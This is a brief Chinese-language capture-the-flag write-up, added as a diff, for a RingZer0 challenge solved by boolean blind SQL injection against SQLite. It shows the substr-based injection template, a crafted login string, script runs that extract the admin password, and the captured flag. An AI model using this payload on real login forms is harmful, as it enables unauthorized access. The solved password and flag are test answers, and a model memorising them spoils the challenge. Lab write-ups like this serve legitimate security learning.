@@ -1,0 +1,17 @@
+http://ringzer0team.com/challenges/19
+
+sqlite中函数不一样，需要注意
+盲注脚本为：
+substr(("+expr+"),"+str(ch_i)+",1)=" + "'" + chr(ascii_i) + "' 
+
+拼接成 admin' and substr((password),6,1)='=' and '1'='1
+进行基于bool的盲注
+
+
+python exfiltration.py 'password' '4dm1nz'
+密码为:4dm1nzP455
+ 
+python exfiltration.py 'SELECT sqlite_version()' '' 
+版本为：3.7.13
+
+登录得到flag:FLAG-rL4t5LRMwjacD82G9vpAd6Gm
